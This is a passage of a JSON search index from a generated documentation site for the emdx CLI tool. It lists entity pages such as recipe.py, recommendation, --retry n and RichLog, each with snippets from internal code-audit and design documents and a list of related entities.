</ul>"},{"location":"entities/recipepy/","title":"recipe.py","text":"<p>Type: heading | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/recipepy/#documents-10","title":"Documents (10)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>extra: list[str] | None = typer.Argument(None, ...)</code> - Legitimate: optional args</li> <li> <p><code>model: str | None = typer.Option(None, ...)</code> - Legitimate: optional mo...</p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Summary</p> <p>...analyze.py | 7 | 7 | Yes (new TypedDicts) | | prime.py | 6 | 6 | Yes (partial) | | recipe.py | 1 | 1 | Yes (doc param) | | briefing.py | 6 | 5 | Yes (new TypedDicts) | | groups.py | 1 | 1 | Yes (DocumentGroup exists) | | browse.py | 1 | 0 | No (local dict co...</p> </li> <li> <p>#6611 Emoji alias removal: synthesis   Section: Critical Distinction: Tag Emojis vs. Display Emojis</p> <ol> <li>Tag system emojis (from <code>EMOJI_ALIASES</code>) \u2014 stored in the database, used for categorization. These are what we're removing. Found in: <code>formatting.py</code>, <code>stale.py</code>, <code>recipe.py</code>, <code>migrations.py</code>, and test assertions.</li> </ol> </li> <li> <p>#6549 Delegate: Review PR #654 using 'gh pr view 654' and 'gh pr diff 654'.  [2/6]   Section: Summary</p> <p>...xecution exceptions</p> </li> <li> <p>Fix B904 compliance: Changed <code>from None</code> to <code>from e</code> in recipe.py exception handlers to preserve the exception chain</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>...cument`</p> </li> <li><code>status.py</code>, <code>analyze.py</code>, <code>prime.py</code> import <code>db_connection</code> directly</li> <li> <p><code>recipe.py</code> imports <code>get_document</code>, <code>search_documents</code></p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>Lazy (heavy, loaded on demand):</p> </li> <li><code>delegate.py</code>: one-shot AI execution (parallel, chain, worktree, PR)</li> <li><code>cascade.py</code>: idea-to-code pipeline with stages</li> <li><code>recipe.py</code>: reusable recipe management</li> <li> <p><code>ask.py</code>: AI Q&amp;A over knowledge base</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Changes Made</p> <p>...s</p> </li> <li>Document not found errors</li> <li>Added \"Error:\" prefix to validation messages in <code>recipe.py</code>:</li> <li>Recipe not found</li> <li> <p>File not found</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...ES (<code>test_commands_groups.py</code>) | | <code>maintain.py</code> | \u274c NO | | <code>prime.py</code> | \u274c NO | | <code>recipe.py</code> | \u274c NO | | <code>similarity.py</code> | \u26a0\ufe0f PARTIAL (tests service, some CLI in <code>test_similarity.py</code>) | | <code>status.py</code> | \u274c NO | | <code>tags.py</code> | \u2705 YES (<code>test_commands_tags.py</code>) | |...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...sary (return types)</p> </li> <li>tags.py: All necessary</li> <li>stale.py: All necessary</li> <li>recipe.py: All necessary</li> <li>gist.py: All necessary</li> <li>epics.py: All necessary</li> <li>ask.py: All necessary</li> <li>analyze.py: All necessary</li> <li> <p>trash.py: All necessary...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>.... Interesting concept, marked experimental in docs. Has dedicated DB tables. | | recipe.py | 160 | THIN WRAPPER - Just wraps <code>emdx delegate --doc</code>. Could be documented pattern instead of separate command. |</p> </li> </ul>"},{"location":"entities/recipepy/#recipepy_1","title":"recipe.py","text":""},{"location":"entities/recipepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.4)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>briefing.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.7)</li> <li><code>cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.4)</li> <li><code>browse.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.4)</li> <li><code>status.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.4)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> <li><code>documents_fts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/recommendation/","title":"recommendation","text":"<p>Type: concept | Mentioned in: 17 documents | First seen: 2025-07-12</p>"},{"location":"entities/recommendation/#documents-17","title":"Documents (17)","text":"<ul> <li> <p>#6511 None Type Analysis [synthesis]   Section: 1. Typer CLI Annotations \u2014 Mostly Correct</p> <p>Recommendation: Keep these annotations for documentation value.</p> </li> <li> <p>#6507 None Type Analysis [7/7]   Section: 1. emdx/ui/cascade/cascade_view.py</p> <p>...h status checks instead, though <code>None</code> is cleaner for \"no previous execution\".</p> </li> <li> <p>Recommendation: Keep as-is; semantically clearer for \"no selection\".</p> </li> <li> <p>#6501 None Type Analysis [6/7]   Section: 1. hybrid_search.py</p> <p>Recommendation: KEEP \u2014 While <code>str = \"\"</code> would work, <code>str | None = None</code> better expresses the semantic of \"not provided\" vs \"empty string\".</p> </li> <li> <p>#6498 None Type Analysis [4/7]   Section: 1. <code>TaskDict.created_at: str | None</code> (types.py:20)</p> <p>Recommendation: Keep as-is. The cost of a false positive (requiring None checks) is lower than the cost of a runtime error if assumptions change.</p> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Issue 1: git.py vs git_ops.py Overlap</p> <p>Recommendation: Merge into single <code>git.py</code> module. Move TUI-specific dataclasses (<code>GitWorktree</code>, <code>GitProject</code>, <code>GitFileStatus</code>) to ui/ or models/.</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Overlapping/Unclear Boundaries \u26a0\ufe0f</p> <p>Recommendation: Consolidate into a search package: ``` services/search/   init.py          # Public interface   fts_search.py        # SQLite FTS5 search   semantic_search.py...</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.1 Service Layer Consolidation (High Priority)</p> <p>Recommendation: </p> </li> <li>Create a <code>DocumentService</code> class that encapsulates all document operations</li> <li>Extract output formatting from <code>UnifiedExecutor</code> into <code>FormatService</code></li> <li> <p>Remove facade modules that only re-export (like <code>models/documents.py</code>)</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 1. Code Duplication</p> <p>Recommendation: Create a decorator <code>@ensure_schema</code> or use Typer callback to centralize this.</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: 3. UNNECESSARY TRANSFORMATIONS: <code>dict(row)</code> Everywhere</p> <p>Recommendation: Consider returning <code>Row</code> objects directly when only specific fields are accessed, or use dataclasses with <code>from_row()</code> class methods for typed results.</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udfe2 LOW: Inconsistent Error Logging Patterns</p> <p>Recommendation: Establish consistent patterns:</p> </li> <li>Use <code>logger.exception()</code> in catch blocks to get stack traces</li> <li>Use <code>logger.error(..., exc_info=True)</code> when not re-raising</li> <li> <p>Never...</p> </li> <li> <p>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: 1. Inconsistent Argument Naming Across Commands</p> <p>Recommendation: Standardize short flags across commands:</p> </li> <li><code>-t</code> = <code>--tags</code> everywhere</li> <li> <p><code>-T</code> = <code>--title</code> everywhere (or just use long form <code>--title</code>)</p> </li> <li> <p>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17]   Section: File-by-File Analysis</p> <p>...mported or used anywhere in codebase</p> </li> <li>Location: <code>emdx/utils/cli.py:13-39</code></li> <li> <p>Recommendation: DELETE entire file (40 lines)</p> </li> <li> <p>#6165 Delegate: Audit emdx/models/ and emdx/database/ for dead code. Check:  [3/17]   Section: Called but return no-ops:</p> <p>Recommendation: These are exported but return no useful data. Check if any CLI commands or UI code actually uses them and remove if not needed.</p> </li> <li> <p>#6153 PR Review Sprint: Smart Ops Synthesis   Section: Common Themes</p> <p>Recommendation: Block merges until basic unit tests exist, or batch test additions as immediate follow-up PR.</p> </li> <li> <p>#6151 Delegate: Review PR #453 (Ask the KB). Run: gh pr diff 453. Check code [6/7]   Section: Test Coverage</p> <p>Recommendation: Consider adding unit tests for:</p> </li> <li>Tag filtering in keyword retrieval</li> <li>Recent days filtering</li> <li>Confidence level calculation</li> <li> <p>Machine output format</p> </li> <li> <p>#4834 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Critical Findings (Prioritized)</p> <p>Recommendation: Consider one of these long-term solutions:</p> </li> <li>Make module functions accept an optional connection parameter</li> <li>Fully encapsulate the connection in the wrapper class</li> <li> <p>Document the global singleton pattern clearly</p> </li> <li> <p>#460 EMDX Slimdown Analysis: Code Reduction Opportunities   Section: 3. Overlapping Functionality</p> <p>Recommendation: Keep Rich's built-in markdown as primary, make mdcat optional/plugin</p> </li> </ul>"},{"location":"entities/recommendation/#related-entities","title":"Related Entities","text":"<ul> <li><code>datetime_utils.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>get_db_path()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>underused code</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>tests/test_lazy_loading.py:10</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>str = \"\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>state tracking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>risk</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>procresult</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>title_normalization.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>recommendations summary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/recommended-actions/","title":"recommended actions","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2025-07-12</p>"},{"location":"entities/recommended-actions/#documents-11","title":"Documents (11)","text":"<ul> <li>#6493 Any Type Removal Analysis [2/5] <p><code>emdx/ui/vim_editor.py</code></p> </li> </ul> Line Current Signature Recommended Type Rationale 23 <code>def __init__(self, app_instance: Any, ...)</code> <code>app_instance: VimEditorHost</code> (Protocol) Same as ... <ul> <li>#6181 Delegate: Audit emdx/services/ for dead code. For EACH of the 22 files [2/17] <p>emdx/services/document_service.py:14-16 - Exports stale workflow-related functions: <code>get_document_source</code>, <code>get_workflow_document_ids</code>, <code>list_non_workflow_documents</code></p> </li> </ul>"},{"location":"entities/recommended-actions/#unused-parameters","title":"UNUSED PARAMETERS","text":"<ol> <li> <p>emdx/services/similarity.py:73-77 - <code>db_path</code> para...</p> </li> <li> <p>#6176 Delegate: Audit emdx/ui/ for dead TUI code. Check ALL ui/ files includ [5/17]</p> </li> </ol> <p>Search found no references to: - swarm - mail (as a feature) - gist-list (as a command)</p>"},{"location":"entities/recommended-actions/#10-no-dead-swarmmailgist-list-references","title":"10. No Dead swarm/mail/gist-list References","text":""},{"location":"entities/recommended-actions/#summary-statistics","title":"Summary Statistics","text":"Finding Count wf_db parameter definitions 12 wf_db pass... <ul> <li>#6177 Delegate: Audit emdx/commands/ for dead code <p>emdx/commands/tasks.py:336</p> </li> <li>Issue: Stats display references workflow_runs counter</li> <li>Code: <code>console.print(f\"By type: {stats['workflow_runs']} workflow, ...\")</code></li> <li>Impact: Displays workflow-related stats that are no longer populated</li> </ul>"},{"location":"entities/recommended-actions/#re","title":"Re...","text":"<ul> <li>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17] <p><code>environment.py</code></p> </li> <li>Status: Actively used</li> <li>Imports at: <code>emdx/services/claude_executor.py:26</code>, <code>emdx/services/task_runner.py:13</code></li> <li>Used exports: <code>get_subprocess_env</code>, <code>ensure_claude_in_path</code>, <code>validate_execution_environment</code></li> <li> <p>Notes: A...</p> </li> <li> <p>#6152 PR Review: #454 Semantic Find Upgrade   Section: Verdict</p> </li> <li>Fix failing tests by mocking HybridSearchService or adding <code>--mode keyword</code></li> <li>Add unit tests for <code>chunk_splitter.py</code> (splitting logic)</li> <li> <p>Add unit tests for `hyb...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Summary of Tech Debt Findings</p> </li> <li>Add logging to all silent exception handlers</li> <li>Create TypedDict definitions for core data structures  </li> <li>Investigate vim_editor positioning issues properly</li> <li> <p>R...</p> </li> <li> <p>#6229 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14]</p> <p>Grouped extras - <code>[ai]</code>, <code>[similarity]</code>, <code>[google]</code>, <code>[all]</code> extras are well-organized</p> </li> <li>Version flexibility - Uses <code>^</code> (caret) appropriately for semver-compatible updates</li> </ul>"},{"location":"entities/recommended-actions/#recommended-actions_1","title":"Recommended Actions","text":""},{"location":"entities/recommended-actions/#recommended-actions_2","title":"Recommended Actions","text":""},{"location":"entities/recommended-actions/#recommended-actions-priority-order","title":"Recommended Actions (Priority Order)","text":"<ol> <li> <p>**Remove python-dot...</p> </li> <li> <p>#6225 Delegate: Audit BUILD/CI DEBT in the emdx project: Check GitHub Action [7/14]</p> <p>\u2705 justfile has <code>check</code> target combining lint+typecheck+test</p> </li> <li>\u2705 Poetry caching configured in CI</li> </ol>"},{"location":"entities/recommended-actions/#recommended-actions-priority-order_1","title":"Recommended Actions (Priority Order)","text":"<ol> <li> <p>Expand Python matrix to [\"3.11\", \"3.12\", \"3.13\"] 2.</p> </li> <li> <p>#414 emdx Cleanup Analysis - Dead Code and Old Plans</p> <p>Cleanup Impact</p> </li> </ol> <p>Removing these files will: - Reduce codebase size by ~2000+ lines - Eliminate confusion about which browser implementation is current - Remove old planning documents that might mislead contributors - Simplify the project structure</p>"},{"location":"entities/recommended-actions/#_1","title":"...","text":""},{"location":"entities/recommended-actions/#related-entities","title":"Related Entities","text":"<ul> <li><code>textual_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>summary audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>recommended actions (priority order)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>misc files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>kwargs: any)</code> | `` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>keybindingregistry</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>help_categories: dict = {}</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>dict[str, dict[str, object]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>def __init__(self, doc_id: int, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>def __init__(self, *args: any, **kwargs: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/retry-n/","title":"--retry n","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-16</p>"},{"location":"entities/retry-n/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6692 FEAT-12: Add --retry flag to delegate   Section: Implementation Complete</p> <p>The <code>--retry N</code> flag for <code>emdx delegate</code> has been implemented and committed on branch <code>delegate/feat-12-add---retry-flag-to-delegate-377b2</code>.</p> </li> <li> <p>#6561 Session Summary (2026-02-16 00:52)   Section: Key Accomplishments</p> <p>...gameplans synthesized** covering:</p> </li> <li>Recent failures in <code>emdx prime</code> (#6560)</li> <li><code>--retry N</code> flag implementation (#6558)</li> <li><code>--memory N</code> flag implementation (#6556)</li> <li><code>emdx wrapup</code> command (#6555, #6557)</li> <li> <p>Additional enhancement (#6559)</p> </li> <li> <p>#6559 Delegate: Document #6543 (Delegate Enhancement Gameplans [2/5]):</p> </li> </ul>"},{"location":"entities/retry-n/#im","title":"Im","text":"<p>Section: Summary</p> <p>Successfully implemented the <code>--retry N</code> flag for <code>emdx delegate</code> to handle transient failures (timeouts, rate limits) with exponential backoff.</p> <ul> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]   Section: Key Findings by Feature</p> </li> <li> <p>#6543 Delegate Enhancement Gameplans [2/5]</p> </li> </ul>"},{"location":"entities/retry-n/#2-retry-n-flag-for-emdx-delegate","title":"2. <code>--retry N</code> Flag for <code>emdx delegate</code>","text":"<p>Purpose: Handle transient failures (timeouts, rate limits) with exponential backoff.</p>"},{"location":"entities/retry-n/#implementation-gameplan-retry-n-flag-for-emdx-delegate","title":"Implementation Gameplan: <code>--retry N</code> Flag for <code>emdx delegate</code>","text":""},{"location":"entities/retry-n/#executive-summary","title":"Executive Summary","text":"<p>Add retry-with-exponential-backoff capability to <code>emdx delegate</code> for handling transient failures (timeouts, rate limits). The implementation wraps the existing `ex...</p> <ul> <li>#6536 EMDX Future Directions: Agent-First Design [synthesis]   Section: Key Findings by Area <p>...ngle-shot execution; no retry, budgets, or quality gates</p> </li> <li>Top solutions:</li> <li><code>--retry N</code> with exponential backoff</li> <li><code>--budget $X</code> for cost limits</li> <li><code>--gate lint,test</code> for quality checks before PR</li> <li> <p><code>--memory N</code> to inject recent delegate context -...</p> </li> <li> <p>#6532 EMDX Future Directions: Agent-First Design [3/4]   Section: 1. Resilient Execution: Retry with Exponential Backoff</p> <p>Solution: Add <code>--retry N</code> flag with exponential backoff.</p> </li> </ul>"},{"location":"entities/retry-n/#related-entities","title":"Related Entities","text":"<ul> <li><code>max_retries</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>testretrybehavior</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testisretryableerror</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>testbackofftiming</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>session continuity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>persistence uses emdx</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>non-retryable</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>flags compose</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>defaults are safe</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>backoff formula</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/richlog/","title":"richlog","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2025-07-12</p>"},{"location":"entities/richlog/#documents-8","title":"Documents (8)","text":"<ul> <li>#6707 Delegate: Analyze the current Task screen (emdx/ui/task_view.py, task_ [2/4]   Section: What It Shows <ul> <li>Left pane (40%): A <code>DataTable</code> listing tasks grouped by status</li> </ul> </li> <li> <p>Right pane (60%): A <code>RichLog</code> showing the full detail of the selected task</p> </li> <li> <p>#6706 Delegate: Analyze the current Activity screen (emdx/ui/activity/) in d [1/4]   Section: What It Shows</p> <p>...rendered markdown content, with three modes:</p> </li> <li>Rendered markdown (default via <code>RichLog</code>)</li> <li>Copy mode (raw text via <code>Log</code> widget, toggled with <code>c</code>)</li> <li> <p>Live log streaming (via <code>RichLog</code> \u2014 for running agent executions)</p> </li> <li> <p>#6580 Delegate: Check tests/ for mocks that use MagicMock() where a spec= wo [3/3]   Section: P2 \u2014 LOW RISK: Callback mocks and simple value mocks</p> <p>...log_browser.py` (many)</p> </li> <li>Risk: Low-medium. The mocks replace Textual widgets (<code>RichLog</code>, etc.) and set <code>.clear()</code>, <code>.write()</code>, <code>.scroll_end()</code>. These are real Textual methods, but Textual's API is under active development.</li> <li> <p>Fix: Harder because Tex...</p> </li> <li> <p>#6534 EMDX Future Directions: Agent-First Design [2/4]   Section: Current State</p> <p>...sed refresh to prevent scroll jumping</p> </li> <li>Two-pane layouts (list + detail/preview)</li> <li>RichLog widgets for live content streaming</li> <li>Modal screens for document preview, help, theme selection</li> <li> <p>Status bars with sparklines, cost tracking, active counts</p> </li> <li> <p>#6488 Any Type Removal Analysis [1/5]   Section: Occurrence 7-8: <code>_show_execution_preview</code> and <code>_start_log_stream</code> parameters</p> <p>Replace with:</p> </li> </ul> <pre><code>def _show_execution_preview(self, exec_data: ExecutionData) -&gt; None:\ndef _start_log_stream(self, log_path: Path, log_widget: RichLog) -&gt; None:\n</code></pre> <ul> <li> <p>#6436 Any/None typing audit [5/5]   Section: cascade/cascade_view.py</p> <p>...]<code>| \u2705 Yes |</code>ExecutionRow<code>| |</code>_start_log_stream.w<code>| L317 |</code>w: Any<code>| \u2705 Yes |</code>RichLog<code>| |</code>_show_pipeline_preview<code>| L341 |</code>act: dict[str, Any]<code>| \u2705 Yes |</code>PipelineActivityRow<code>| |</code>_get_selected_pipeline_act<code>| L423 |</code>-&gt; dict[str, Any] | None` |...</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 6. DUPLICATE IMPORTS (Code Quality)</p> <p>...ewModal`</p> </li> <li><code>emdx/ui/cascade/cascade_view.py</code> - Duplicates: <code>ScrollableContainer</code>, <code>RichLog</code>, <code>LiveLogWriter</code></li> <li> <p><code>emdx/ui/command_palette/palette_presenter.py</code> - Duplicates: <code>SearchQuery</code></p> </li> <li> <p>#455 Text Selection Issues Research - TUI Browser UX Problem Analysis   Section: Executive Summary</p> <p>...he Textual framework and terminal mouse handling. The current implementation uses <code>RichLog</code> widgets for content display, which do not support native text selection.</p> </li> </ul>"},{"location":"entities/richlog/#related-entities","title":"Related Entities","text":"<ul> <li><code>taskview</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>status bar</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>scrollablecontainer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>activitybrowser</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>_show_pipeline_preview</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>_selected_exec</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>_pipeline_data</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>_get_selected_pipeline_act</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>.write()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>livelogwriter</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/risk-assessment/","title":"risk assessment","text":"<p>Type: heading | Mentioned in: 14 documents | First seen: 2026-01-14</p>"},{"location":"entities/risk-assessment/#documents-14","title":"Documents (14)","text":"<ul> <li>#6874 Delegate synthesis [synthesis] <p>Audit test files \u2014 tests for dead functions should be removed alongside the functions</p> </li> <li>Remove <code>GameplanStatsDict</code> from <code>models/types.py</code> (only type for dead <code>get_gameplan_stats</code>)</li> </ul>"},{"location":"entities/risk-assessment/#risk-assessment_1","title":"Risk 